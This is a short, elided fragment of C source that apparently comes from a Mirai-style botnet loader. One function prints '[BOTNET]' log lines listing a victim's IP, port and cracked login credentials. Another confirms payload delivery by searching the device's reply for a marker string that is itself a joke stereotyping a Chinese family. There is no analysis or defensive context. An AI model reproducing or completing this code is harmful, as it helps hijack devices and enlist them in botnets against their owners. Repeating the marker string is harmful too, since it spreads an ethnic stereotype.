...
void connection_close(struct connection *conn)
{
    ...
    if(conn->open)
    {
        ...
        if(conn->success)
        {
            ...
            fprintf(stderr, "\033[1;33m[\033[0;31mBOTNET\033[1;33m] [\033[0;31m%d.%d.%d.%d\033[1;33m:\033[0;31m%d\033[1;33m] [\033[0;31m%s\033[1;33m:\033[0;31m%s\033[1;33m] [\033[0;31m%s\033[1;33m] [\033[0;31m%d\033[1;33m]\x1B[0m\n",
...
int connection_verify_payload(struct connection *conn)
{
    ...
    if(util_memsearch(conn->rdbuf, offset, "gosh that chinese family at the other table sure ate a lot", 58) == -1)
        return offset;
    else
        return 255 + offset;
}
